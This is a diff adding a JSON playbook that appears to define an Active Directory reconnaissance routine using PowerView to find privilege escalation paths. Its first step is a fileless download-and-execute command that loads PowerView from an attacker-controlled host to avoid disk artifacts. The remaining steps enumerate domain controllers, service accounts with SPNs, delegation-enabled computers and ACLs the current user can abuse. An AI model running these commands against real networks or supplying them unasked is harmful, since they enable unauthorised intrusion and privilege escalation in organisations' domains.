@@ -1,0 +1,43 @@
+{
+  "name": "Comprehensive Domain Scan with PowerView",
+  "description": "Execute in-depth reconnaissance using the PowerView framework for privilege escalation vectors.",
+  "tools": [
+    {
+      "name": "PowerView",
+      "description": "Advanced PowerShell AD recon toolkit",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    }
+  ],
+  "steps": [
+    {
+      "index": 1,
+      "name": "Load PowerView In-Memory",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')",
+      "description": "Download and execute without disk artifacts."
+    },
+    {
+      "index": 2,
+      "name": "Forest and Domain Details",
+      "command": "Get-NetForest; Get-NetDomain | Select Name,DomainControllers",
+      "description": "Map forest structure and DC locations."
+    },
+    {
+      "index": 3,
+      "name": "Service Account Discovery",
+      "command": "Get-NetUser -SPN | Select samaccountname,serviceprincipalname,memberof",
+      "description": "Identify accounts tied to services."
+    },
+    {
+      "index": 4,
+      "name": "Delegation Targets",
+      "command": "Get-NetComputer -Unconstrained | Select dnshostname; Get-NetComputer -TrustedToAuth | Select dnshostname",
+      "description": "Find systems allowing delegation abuse."
+    },
+    {
+      "index": 5,
+      "name": "Excessive Rights",
+      "command": "Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.IdentityReference -match $env:USERNAME} | Select ObjectDN,ActiveDirectoryRights",
+      "description": "Locate objects where current user has elevated control."
+    }
+  ]
+}
